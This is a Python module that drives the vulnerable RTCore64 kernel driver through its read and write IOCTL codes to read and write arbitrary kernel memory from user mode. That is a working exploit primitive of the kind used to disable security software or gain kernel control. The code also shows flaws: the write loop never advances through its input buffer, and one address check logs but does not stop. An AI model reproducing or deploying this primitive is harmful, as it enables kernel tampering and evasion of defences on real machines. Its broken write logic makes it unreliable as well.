"""
Module for interacting with RTCore64 driver to read and write kernel memory.

This module provides functions to read and write kernel memory using the RTCore64 driver.

Classes:
    Rtcore64MemoryWrite: Structure for writing kernel memory using RTCore64.
    Rtcore64MemoryRead: Structure for reading kernel memory using RTCore64.

Functions:
    read_memory_rtcore: Reads data from memory using RTCore64 driver.
    write_memory_rtcore: Writes data to memory using RTCore64 driver.
"""

from ctypes import Structure, sizeof, c_byte, c_uint8, c_uint16, c_uint32, c_uint64
import logging
import win32file

RTCORE64_MEMORY_READ_CODE = 0x80002048
RTCORE64_MEMORY_WRITE_CODE = 0x8000204c


class Rtcore64MemoryWrite(Structure):
    """
    Structure for writing kernel memory using RTCore64.
    """
    _pack_ = 1
    _fields_ = [("pad1",c_byte * 0x8),
                ("address", c_uint64),
                ("pad2", c_byte * 0x4),
                ("offset", c_uint32),
                ("write_size", c_uint32),
                ("write_value", c_uint32),
                ("pad3",c_byte * 0x10)]

class Rtcore64MemoryRead(Structure):
    """
    Structure for reading kernel memory using RTCore64.
    """
    _pack_ = 1
    _fields_ = [("pad1",c_byte * 0x8),
                ("address", c_uint64),
                ("pad2", c_byte * 0x4),
                ("offset", c_uint32),
                ("read_size", c_uint32),
                ("read_value", c_uint32),
                ("pad3",c_byte * 0x10)]


def read_memory_rtcore(size, address):
    """
    Reads data from memory using RTCore64 driver.

    This function reads data from memory using the RTCore64 driver.

    :param size: The size of data to read from memory.
    :param address: The starting address in memory from which to read.
    :return: A bytes object containing the read data.
    """

    driver_handle = win32file.CreateFile("\\\\.\\RTCore64", 0xC0000000, 0, None, 0x3, 0, None)
    if int(driver_handle) < 0:
        logging.error("Failed to obtain RTCore64 handle")
        logging.error("Exiting")
        exit()

    read_command = Rtcore64MemoryRead()
    read_command.address = address
    result = b''

    while size:
        if size >= 4:
            read_command.read_size = 4
        elif size >= 2:
            read_command.read_size = 2
        else:
            read_command.read_size = 1

        read_command.offset = 0

        if address < 0x0000800000000000:
            logging.error("Userland address used: 0x%s\n\
                          This should not happen, aborting...", f"{address:016x}")
            exit()
        if address < 0xFFFF800000000000:
            logging.error("Non canonical address used: 0x%s\n\
                          Aborting to avoid a BSOD...",  f"{address:016x}")

        res = win32file.DeviceIoControl(driver_handle,
                         RTCORE64_MEMORY_READ_CODE,
                        bytearray(read_command),
                         sizeof(Rtcore64MemoryRead))

        out_buf = Rtcore64MemoryRead.from_buffer_copy(res)

        read_command.address += read_command.read_size
        size -= read_command.read_size
        result += out_buf.read_value.to_bytes(read_command.read_size, byteorder='little')

    return result

def write_memory_rtcore(address, buffer):
    """
    Writes data to memory using RTCore64 driver.

    This function writes data to memory using the RTCore64 driver.

    :param address: The address in memory to write to.
    :param buffer: The data buffer to write to the memory.
    """

    driver_handle = win32file.CreateFile("\\\\.\\RTCore64", 0xC0000000, 0, None, 0x3, 0, None)
    if int(driver_handle) < 0:
        logging.error("Failed to obtain RTCore64 handle")
        return False

    write_command = Rtcore64MemoryWrite()
    write_command.address = address
    write_command.offset = 0
    size = len(buffer)

    while size:
        if size >= 4:
            write_command.write_size = 4
            write_command.write_value = c_uint32.from_buffer(buffer).value
        elif size >= 2:
            write_command.write_size = 2
            write_command.write_value = c_uint16.from_buffer(buffer).value
        else:
            write_command.write_size = 1
            write_command.write_value = c_uint8.from_buffer(buffer).value

        if address < 0x0000800000000000:
            logging.error("Userland address used: 0x%s\n\
                          This should not happen, aborting...", f"{address:016x}")
            exit()
        if address < 0xFFFF800000000000:
            logging.error("Non canonical address used: 0x%s\n\
                          Aborting to avoid a BSOD...",  f"{address:016x}")
            exit()

        win32file.DeviceIoControl(driver_handle,
                         RTCORE64_MEMORY_WRITE_CODE,
                        bytearray(write_command),
                         sizeof(Rtcore64MemoryRead))



        write_command.address += write_command.write_size
        size -= write_command.write_size
